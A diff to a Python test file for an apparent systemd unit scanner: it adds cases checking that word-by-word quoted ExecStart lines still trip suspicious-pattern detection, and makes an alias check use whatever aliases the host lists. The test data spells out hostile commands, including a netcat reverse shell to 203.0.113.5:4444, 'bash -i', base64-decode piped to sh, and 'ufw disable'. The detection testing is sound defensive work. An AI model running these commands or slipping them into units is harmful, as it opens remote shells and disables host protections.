@@ -89,6 +89,10 @@ _loud = [
     ("ExecStart=/usr/bin/python3 -c 'import socket'", "python3 -c"),
     ("ExecStart=/bin/sh -c 'base64 -d <<< abc | sh'", "base64 -d"),
     ("ExecStart=/usr/sbin/ufw disable", "ufw disable"),
+    # Quoted word by word, which systemd runs exactly the same way.
+    ('ExecStart="/bin/bash" "-i"', "bash -i"),
+    ('ExecStart="/usr/bin/python3" "-c" "import socket"', "python3 -c"),
+    ('ExecStart="/usr/bin/nc" "-e" "/bin/sh" 203.0.113.5 4444', "nc"),
 ]
 for text, pat in _loud:
     pats = [(p, m, w) for p, m, w in am.SUSPICIOUS_PATTERNS if p == pat]
@@ -168,8 +172,15 @@ check("and the count of answered units is the count asked",
       _cov["units_answered"], _cov["units_asked"])
 check_true("template names are counted and named as skipped",
            _cov["template_names_skipped"] > 0)
-_sshd = [s for s in _rows if s["name"] == "sshd.service"]
-check_true("an alias (sshd.service -> ssh.service) resolves to a path",
+# The alias this host really has. sshd.service exists only while SSH is
+# switched on, so a fixed name failed on a computer where it is off; any
+# alias systemd lists proves the same thing.
+_alias_names = [line.split()[0] for line in subprocess.run(
+    ["systemctl", "list-unit-files", "--type=service", "--state=alias", "--no-legend"],
+    capture_output=True, text=True).stdout.splitlines() if line.strip() and "@" not in line.split()[0]]
+_alias_names.sort(key=lambda n: n != "sshd.service")
+_sshd = [s for n in _alias_names for s in _rows if s["name"] == n][:1]
+check_true(f"an alias ({_sshd[0]['name'] if _sshd else 'none found'}) resolves to a path",
            bool(_sshd and _sshd[0]["path"]))
 check_true("and systemd's own state travels with it",
            bool(_sshd and _sshd[0]["state"]))
